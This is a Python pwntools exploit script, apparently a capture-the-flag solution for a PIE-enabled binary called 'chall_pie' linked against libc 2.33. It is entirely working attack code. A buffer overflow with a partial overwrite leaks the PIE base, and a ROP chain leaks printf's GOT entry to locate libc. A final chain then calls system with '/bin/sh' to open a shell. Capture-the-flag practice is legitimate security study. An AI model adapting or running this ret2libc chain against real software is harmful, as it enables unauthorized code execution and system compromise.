from pwn import *

libc = ELF("libc-2.33.so")
elf = ELF('./chall_pie')
p = elf.process()
#p = remote('localhost', 9999)

payload = b'a'*0xe8
payload += b'\x02'

p.send(payload)
sleep(0.2)

p.recvuntil(b'name: ')

pie_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1213
log.info('Pie base: ' + hex(pie_base))

pop_rdi = pie_base + 0x1333
ret = pop_rdi + 1
printf_got = pie_base + elf.got['printf']
printf = pie_base + elf.sym['printf']
vuln = pie_base + elf.sym['vuln']

payload = p64(pie_base + 0x123b)
payload += p64(pop_rdi)
payload += b'a'*0x7 + b'\xff'
payload += p64(pop_rdi)
payload += p64(printf_got)
payload += p64(printf)
payload += p64(ret)
payload += p64(vuln)
payload = payload.ljust(0x100, b'\x00')
payload += b'\x7a'

p.send(payload)
sleep(0.2)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['printf']
log.info('Libc base: ' + hex(libc.address))

bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

payload = b'a'*0xe8
payload += p64(pie_base + 0x123b)
payload += p64(pop_rdi)
payload += b'a'*0x7 + b'\xff'
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
payload = payload.ljust(0x1e8, b'\x00')
payload += b'\x7a'

p.recv()
p.send(payload)

p.interactive()
